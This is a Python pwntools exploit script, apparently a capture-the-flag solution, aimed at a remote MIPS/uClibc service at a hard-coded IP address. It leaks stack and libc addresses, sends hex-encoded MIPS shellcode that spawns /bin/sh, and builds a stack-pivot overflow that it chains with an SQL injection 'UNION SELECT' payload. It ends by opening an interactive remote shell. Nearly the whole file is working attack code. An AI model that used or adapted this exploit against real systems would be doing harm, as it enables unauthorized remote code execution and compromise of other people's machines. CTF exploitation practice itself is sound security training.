from utils import *

context(log_level = 'debug')

r = remote('59.77.135.196', 20006)
#r = remote('127.0.0.1', 33333)

#payload = '\x52' * 0x1000
#payload = ''.join(map(chr,range(0x10, 256))).ljust(0x1000, '\x52')
payload = 'A' * 0x1000
r.sendline(payload)
r.recvline()
r.recvn(0x1000)

tab = '000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f343536373831323334353a3b3c3d3e3f404e4f505152535455565758595a4142434445464748494a4b4c4d5b5c5d5e5f606e6f707172737475767778797a6162636465666768696a6b6c6d7b7c7d7e7f808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff'.decode('hex')
stkaddr = u32(r.recvn(4)) #u32(''.join(map(lambda x: chr(tab.index(x)), r.recvn(4))))
mid__uClibc_main = u32(r.recvn(4)) #u32(''.join(map(lambda x: chr(tab.index(x)), r.recvn(4))))

log.success('Some stack address: %s' % hex(stkaddr))
log.success('Mid __uClibc_main: %s' % hex(mid__uClibc_main))

debug = 0x004022A4
main = 0x4014D4

#payload = 'A' * 0x200 + '\x54' + '\x42'
#plain = "'" + "A" * 600 + "'"
#plain = "load_extension('libc.so.0', 'system')"
#plain = 'sqlite_version()'

''' Pivot! +0x9C is also controlled..
.text:00401C48                 lw      $ra, 0x9C($sp)   # Load Word
.text:00401C4C                 lw      $fp, 0x98($sp)   # Load Word
.text:00401C50                 addiu   $sp, 0xA0        # Add Immediate Unsigned
.text:00401C54                 jr      $ra              # Jump Register
.text:00401C58                 nop
'''

# 0x20 + 0x20 + 0x18

# For debug purpose
#shellcode = 'a4220224000000004000023c000000000800400000000000'.decode('hex')
shellcode = '66060624ffffd004ffff0628e0ffbd270110e4271ff08424e8ffa4afecffa0afe8ffa527ab0f02240c0101012f62696e2f7368'.decode('hex')
shellcode = '57044220'.decode('hex') * ((0x1000-len(shellcode))/4) + shellcode
log.info('Shellcode length: %d' % len(shellcode))
log.info('Encoded shellcode: %s' % shellcode.encode('hex'))

payload = shellcode

r.sendline(payload)
r.recvuntil('/bin/sh')

# time.sleep(5.0) # Wait 5 seconds to block "read" syscall

target = stkaddr - 0x2248 + 0x1240 + 0x400
#target = stkaddr - 0x2248 - 0x20
#prefix = 'A' * (0x9C - 0x54) + p32(target) + p32(0x4012D4)
prefix = 'A' * (0x9C - 0x58) + p32(target)
#prefix = p32(debug) * (0x200 / 4)

assert len(prefix) <= 0x200
plain = "hex(zeroblob(293))||CHAR(0x41,0x41, 0x54,0x0C,0x40,0)"
payload = prefix.ljust(0x200, '\x00') + '\x54' + '\x41' + "' UNION SELECT " + plain + " --"

for i in xrange(10):
	r.send(payload[i])
	time.sleep(0.3)
r.sendline(payload[10:])

r.recvuntil('\x54\x0c\x40')
#r.sendline(payload)
r.sendline('pwd')
r.recvuntil('/')
r.interactive()
#r.recvall()
